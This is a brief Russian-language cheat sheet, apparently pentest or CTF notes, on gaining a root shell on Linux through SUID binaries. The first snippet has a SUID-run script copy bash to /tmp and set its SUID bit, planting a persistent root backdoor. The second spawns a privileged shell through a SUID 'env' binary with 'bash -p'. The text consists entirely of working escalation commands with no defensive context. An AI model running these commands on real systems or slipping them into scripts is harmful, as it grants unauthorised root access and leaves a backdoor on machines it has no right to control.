### 1) Получение root-ового шела
> При условии что это выполняет скрипт с SUID-битом
```shell
/bin/sh -c '/usr/bin/cp /usr/bin/bash /tmp/bash && /usr/bin/chmod 4755 /tmp/bash'
```

### 2) Получение root через SUID `env`

/usr/bin/env "commands" "args"

```shell
/usr/bin/env /usr/bin/bash -p
```